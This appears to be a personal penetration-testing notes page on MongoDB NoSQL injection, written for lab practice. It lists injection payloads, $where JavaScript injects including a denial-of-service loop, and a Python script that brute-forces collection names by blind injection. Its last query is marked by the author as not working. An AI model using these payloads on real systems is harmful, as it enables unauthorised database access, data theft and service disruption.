<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NoSQL Injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># NoSQL Injection</h1></strong><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection</a><br />• <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#mongodb-payloads">https://book.hacktricks.xyz/pentesting-web/nosql-injection#mongodb-payloads</a><br />• <a href="https://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf">https://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf</a><br /><br /><strong><h2>## MongoDB</h2></strong><strong><br /></strong>Examples<br />• oscp 10.11.1.237 - Humble<br /><br />Try submitting <code>&#39;</code> to get an error.<br />Read the error and locate where your inject is. Now you know how your inject is working<strong><br /><br /></strong><strong><h3>### Payloads</h3></strong><br /><div class="codebox"><div class="codebox">true,&nbsp;$where:&nbsp;&#39;1&nbsp;==&nbsp;1&#39;<br />,&nbsp;$where:&nbsp;&#39;1&nbsp;==&nbsp;1&#39;<br />$where:&nbsp;&#39;1&nbsp;==&nbsp;1&#39;<br />&#39;,&nbsp;$where:&nbsp;&#39;1&nbsp;==&nbsp;1<br />1,&nbsp;$where:&nbsp;&#39;1&nbsp;==&nbsp;1&#39;<br />{&nbsp;$ne:&nbsp;1&nbsp;}<br />&#39;,&nbsp;$or:&nbsp;[&nbsp;{},&nbsp;{&nbsp;&#39;a&#39;:&#39;a<br />&#39;&nbsp;}&nbsp;],&nbsp;$comment:&#39;successful&nbsp;MongoDB&nbsp;injection&#39;<br />db.injection.insert({success:1});<br />db.injection.insert({success:1});return&nbsp;1;db.stores.mapReduce(function()&nbsp;{&nbsp;{&nbsp;emit(1,1<br />||&nbsp;1==1<br />&#39;&nbsp;&amp;&amp;&nbsp;this.password.match(/.*/)//+%00<br />&#39;&nbsp;&amp;&amp;&nbsp;this.passwordzz.match(/.*/)//+%00<br />&#39;%20%26%26%20this.password.match(/.*/)//+%00<br />&#39;%20%26%26%20this.passwordzz.match(/.*/)//+%00<br />{$gt:&nbsp;&#39;&#39;}<br />[$ne]=1<br />&#39;;sleep(5000);<br />&#39;;it=new%20Date();do{pt=new%20Date();}while(pt-it&lt;5000);</div></div><br /><br /><strong><h3>### $where Statement</h3></strong><br />Explanation of <code>$where</code> and why it&#39;s bad:<br /><a href="https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code">https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code</a><br /><br />Basically, <code>$where</code> allows you to execute javascript code.<br />Separate each javascript function with <code>;</code><br /><br /><strong>$where Injects</strong><br /><code>&#39;; return &#39;&#39; == &#39;</code> - Evaluates to true, so should return everything allowed by the query<br /><code>&#39;;while(1);var foo=&#39;bar</code> - causes DoS<br /><code>&#39;;sleep(100);var foo=&#39;bar</code> - causes sleep for 10 seconds<br /><code>&#39;;return(true);var foo=&#39;bar</code> - returns all entries<br /><code>&#39;;return(false);var foo=&#39;bar</code> - returns nothing<br /><br /><strong><h2>## Blind NoSQL Injection</h2></strong><br />Refer to SQL Injection for an explanation on blind injection is.<br /><br /><strong><h3>### Bryan Sullivan&#39;s Method (from a BlackHat talk)</h3></strong><br /><a href="https://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf">https://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf</a><br /><br />To execute any kind of successful blind injection attack, the attacker needs to see a difference in the serverʼs response to a true condition versus its response to a false condition<br /><br /><code>&#39;;return(true);var foo=&#39;bar</code> - returns all entries<br /><code>&#39;;return(false);var foo=&#39;bar</code> - returns nothing<br /><br />If there is any difference in the serverʼs response between these two injections, then the attacker can now “ask” the server any true/false “question”.<br /><br /><strong>#### 1. Query how many collections are in the database:</strong><br /><code>&#39;;return(db.getCollectionNames().length == 1);var foo=&#39;bar</code><br /><br /><strong>#### 2. Query for collection names length</strong><br /><code>&#39;;return(db.getCollectionNames()[0].length == 1);var foo=&#39;bar</code> - query 1st collection<br /><code>&#39;;return(db.getCollectionNames()[1].length == 1);var foo=&#39;bar</code> - query 2nd collection<br /><code>&#39;;return(db.getCollectionNames()[2].length == 1);var foo=&#39;bar</code> - query 3rd collection<br /><br /><strong>#### 3. Query for collection names<br /></strong>Here&#39;s a script that will query for the names of the collections in the database.<br /><div class="codebox"><div class="codebox">#!/usr/bin/env&nbsp;python3<br />import&nbsp;requests<br /><br />collection&nbsp;=&nbsp;&quot;&quot;<br />chars&nbsp;=&nbsp;&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-&quot;<br />position&nbsp;=&nbsp;0<br /><br />while&nbsp;True:<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;char&nbsp;in&nbsp;chars:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;requests.post(&#39;http://127.0.0.1:8500/cgi-bin/mongo/2.2.3/dbparse.py&#39;,&nbsp;data&nbsp;=&nbsp;{&quot;CompanyName&quot;:&quot;&#39;;return(db.getCollectionNames()[0][&quot;&nbsp;+&nbsp;str(position)&nbsp;+&nbsp;&quot;]&nbsp;==&nbsp;&#39;&quot;&nbsp;+&nbsp;char&nbsp;+&nbsp;&quot;&#39;);var&nbsp;foo=&#39;bar&quot;},&nbsp;verify=False)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#store&nbsp;response&nbsp;to&nbsp;POST&nbsp;request&nbsp;in&nbsp;a&nbsp;variable&nbsp;called&nbsp;&#39;response&#39;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;r.text<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;search&nbsp;through&nbsp;response&nbsp;for&nbsp;&quot;&lt;td&nbsp;align=\&quot;center\&quot;&gt;Abellio&nbsp;London&nbsp;Ltd.&lt;/td&gt;&quot;.&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;if&nbsp;present,&nbsp;find()&nbsp;returns&nbsp;386<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check&nbsp;=&nbsp;response.find(&quot;&lt;td&nbsp;align=\&quot;center\&quot;&gt;Abellio&nbsp;London&nbsp;Ltd.&lt;/td&gt;&quot;)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print(&quot;char&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;char&nbsp;+&nbsp;&quot;&nbsp;position&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;str(position)&nbsp;+&nbsp;&quot;&nbsp;check&nbsp;return&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;str(check))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;if&nbsp;inject&nbsp;is&nbsp;correct&nbsp;(i.e.&nbsp;character&nbsp;gets&nbsp;found&nbsp;on&nbsp;page)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;check&nbsp;==&nbsp;386:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;collection&nbsp;=&nbsp;collection&nbsp;+&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;the&nbsp;char&nbsp;to&nbsp;the&nbsp;collection&nbsp;variable<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;collection&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;collection)&nbsp;#&nbsp;print&nbsp;the&nbsp;collection<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;position&nbsp;+=&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;increment&nbsp;the&nbsp;position<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;continue&nbsp;bruteforcing<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;otherwise,&nbsp;move&nbsp;onto&nbsp;next&nbsp;character<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue</div></div><br /><br /><strong>#### 4. Query for number of documents in each collection</strong><br />(couldn&#39;t get this bit to work, think query is wrong)<br /><code>&#39;;return(db.london_garagas.find().length == 3);var foo=&#39;bar</code><br /><br /></div>
</body>
</html>
